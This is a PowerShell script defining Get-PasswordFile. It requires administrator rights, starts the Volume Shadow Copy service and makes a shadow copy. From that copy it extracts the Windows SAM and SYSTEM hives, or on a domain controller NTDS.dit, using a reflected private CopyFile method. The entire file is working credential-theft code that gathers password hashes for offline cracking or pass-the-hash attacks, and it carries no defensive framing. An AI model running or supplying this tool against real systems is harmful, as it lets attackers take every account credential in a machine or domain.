function Get-PasswordFile { 
<# 
.SYNOPSIS 
  
    Copies either the SAM or NTDS.dit and system files to a specified directory. 
  
.PARAMETER DestinationPath 
  
    Specifies the directory to the location where the password files are to be copied. 
  
.OUTPUTS 
  
    None or an object representing the copied items. 
  
.EXAMPLE 
  
    Get-PasswordFile "c:\temp" 
  
#>
  
    [CmdletBinding()] 
    Param
    ( 
        [Parameter(Mandatory = $true, Position = 0)] 
        [ValidateScript({Test-Path $_ -PathType 'Container'})]  
        [ValidateNotNullOrEmpty()] 
        [String] 
        $DestinationPath     
    ) 
  
        function Copy-RawItem
        { 
  
        [CmdletBinding()] 
        [OutputType([System.IO.FileSystemInfo])] 
        Param ( 
            [Parameter(Mandatory = $True, Position = 0)] 
            [ValidateNotNullOrEmpty()] 
            [String]
            $Path, 
  
            [Parameter(Mandatory = $True, Position = 1)] 
            [ValidateNotNullOrEmpty()] 
            [String]
            $Destination, 
  
            [Switch]
            $FailIfExists
        ) 
  
        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')} 
        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native') 
        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))  
  
        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))) 
  
        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
  
        if ($CopyResult -eq $False -and $HResult -ne 0) 
        { 
            throw ( New-Object ComponentModel.Win32Exception ) 
        } 
        else
        { 
            Write-Output (Get-ChildItem $Destination) 
        } 
    } 
   
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Error "Not running as admin. Run the script with elevated credentials"
        Return
    }
        
    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode 
    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual} 
  
    $VssStatus = (Get-Service vss).status  
    if ($VssStatus -ne "Running") {Start-Service vss} 
        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
        $IsDC = $False
        if ($DomainRole -gt 3) { 
            $IsDC = $True
            $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File"
            $FileDrive = ($NTDSLocation).Substring(0,3) 
        } else {$FileDrive = $Env:HOMEDRIVE + '\'} 
        $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible") 
        $ReturnValue = $ShadowCopy.ReturnValue 
  
        if ($ReturnValue -ne 0) { 
            Write-Error "Shadow copy failed with a value of $ReturnValue"
            Return
        }  
      
        $ShadowID = $ShadowCopy.ShadowID 
        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject 
      
            if ($IsDC -ne $true) { 
  
                $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam" 
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
  
                Copy-RawItem $SamPath "$DestinationPath\sam"
                Copy-RawItem $SystemPath "$DestinationPath\system"
            } else { 
                      
                $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit" 
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system"
  
                Copy-RawItem $NTDSPath "$DestinationPath\ntds"
                Copy-RawItem $SystemPath "$DestinationPath\system"
            }     
      
        If ($VssStatus -eq "Stopped") {Stop-Service vss} 
        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
}